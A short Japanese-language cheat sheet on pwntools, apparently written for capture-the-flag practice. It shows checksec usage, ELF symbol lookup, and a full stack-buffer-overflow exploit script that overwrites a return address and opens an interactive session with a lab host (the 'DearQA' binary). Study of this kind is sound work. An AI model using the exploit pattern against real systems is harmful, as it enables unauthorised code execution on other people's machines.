# pwntools

https://github.com/Gallopsled/pwntools

## コマンド

```shell
# 実行ファイルで有効になっているセキュリティ機構を調べる
pwn checksec --file <file>
```

## バイナリ解析

```python
# ライブラリをロード
>>> from pwn import *

# バイナリをロード
>>> binary = context.binary = ELF("./DearQA-1627223337406.DearQA")

# 関数のアドレス
>>> hex(binary.symbols['vuln'])
```

## 例

### スタックオーバーフロー

```shell
#!/usr/bin/env pyhon3
from pwn import *
import sys

host = "10.10.37.23"
port = 5700
context(terminal = ['tmux', 'new-window'])

binary = context.binary = ELF("./DearQA-1627223337406.DearQA")
context(os = "linux", arch = "amd64")
connect = remote(host, port)
log.info("[+] Starting buffer Overflow")
connect.recvuntil(b"What's your name: ")
log.info("[+] Crafting payload")
payload = b'A' * 40
payload += p64(0x00400686)
log.info("[+] Sending Payload to the remote server")
connect.sendline(payload)
connect.interactive()
```

上記の例で、binary と 2 か所の context は、コメントアウトしても機能する。
